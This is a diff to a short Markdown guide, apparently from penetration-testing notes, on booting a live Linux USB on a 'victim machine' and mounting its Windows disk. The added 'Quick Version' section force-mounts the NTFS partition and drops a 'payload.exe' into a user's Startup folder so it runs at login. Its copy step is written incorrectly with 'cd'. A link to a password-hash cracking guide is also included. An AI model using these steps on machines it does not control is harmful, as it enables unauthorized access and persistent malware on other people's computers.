@@ -6,8 +6,8 @@ This is how you do it
 
 ## Create linux-usb
 
-Just follow this guide for ubuntu
-http://www.ubuntu.com/download/desktop/create-a-usb-stick-on-ubuntu
+Just follow this guide for ubuntu  
+[http://www.ubuntu.com/download/desktop/create-a-usb-stick-on-ubuntu](http://www.ubuntu.com/download/desktop/create-a-usb-stick-on-ubuntu)
 
 ## Boot into live-usb on victim machine
 
@@ -15,13 +15,14 @@ If the machine doesn't automatically detect the usb you might have to enter into
 
 ## Mount disk
 
-Now you have booted into the live-usb, now we need to mount the hard-drive to the usb-linux-filesystem.
+Now you have booted into the live-usb, now we need to mount the hard-drive to the usb-linux-filesystem.  
 First we want to find out what partitions we have:
 
 ```
 sudo su
 fdisk -l
 ```
+
 This will give you a list of partitions. They will look something like this
 
 ```
@@ -32,6 +33,7 @@ This will give you a list of partitions. They will look something like this
 Identify from the list the partition you want to mount.
 
 Here we create a space for where we want to mount the partition.
+
 ```
 mkdir /media/windows
 ```
@@ -52,7 +54,23 @@ Notice that is is `umount` and not unmount.
 umount /media/windows
 ```
 
+## Quick Version
+
+```
+F12
+mkdir /mnt/windows
+ntfs-3g /dev/sda1 /mnt/windows -o force
+cd /mnt/windows/windows
+cd /users/[*]/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup
+cd payload.exe -> ..../Startup
+
+location of sploit
+lib/live/mount/medium/tools/payload.exe
+```
+
+## 
 
 ## Dump the hashes
 
-https://prakharprasad.com/windows-password-cracking-using-john-the-ripper/
+[https://prakharprasad.com/windows-password-cracking-using-john-the-ripper/](https://prakharprasad.com/windows-password-cracking-using-john-the-ripper/)
+
